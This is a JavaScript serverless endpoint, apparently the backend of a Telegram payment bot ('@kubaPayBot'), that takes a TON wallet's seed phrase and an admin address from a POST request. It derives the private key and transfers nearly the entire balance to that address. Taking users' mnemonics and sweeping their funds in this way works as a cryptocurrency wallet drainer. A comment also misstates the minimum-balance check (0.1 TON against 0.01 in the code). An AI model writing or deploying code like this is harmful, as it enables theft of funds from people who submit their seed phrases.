import { TonClient, WalletContractV4, internal, fromNano } from "@ton/ton";
import { mnemonicToPrivateKey } from "@ton/crypto";

// Usamos el RPC público de Toncenter
const TON_RPC = "https://toncenter.com/api/v2/jsonRPC";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Método no permitido');

  const { seed, adminAddress } = req.body;

  try {
    const client = new TonClient({ endpoint: TON_RPC });
    const mnemonicArray = seed.split(" ");
    const keyPair = await mnemonicToPrivateKey(mnemonicArray);

    const wallet = WalletContractV4.create({ 
        workchain: 0, 
        publicKey: keyPair.publicKey 
    });
    
    const contract = client.open(wallet);
    const balance = await contract.getBalance();
    const formattedBalance = fromNano(balance);

    // 1. Validar saldo mínimo (0.1 TON)
    if (parseFloat(formattedBalance) < 0.01) {
      return res.status(200).json({ error: "Insufficient TON balance" });
    }

    // 2. Preparar el envío
    const seqno = await contract.getSeqno();
    
    // Dejamos 0.02 TON en la wallet para pagar el gas de salida
    const amountToSend = balance - 20000000n; 

    const transfer = await contract.createTransfer({
      seqno,
      secretKey: keyPair.secretKey,
      messages: [
        internal({
          to: adminAddress,
          value: amountToSend,
          bounce: false,
          body: "@kubaPayBot", // Comentario opcional
        })
      ]
    });

    await contract.send(transfer);

    res.status(200).json({ 
        success: true, 
        amount: formattedBalance,
        address: wallet.address.toString()
    });

  } catch (error) {
    res.status(500).json({ error: error.message });
  }
      }
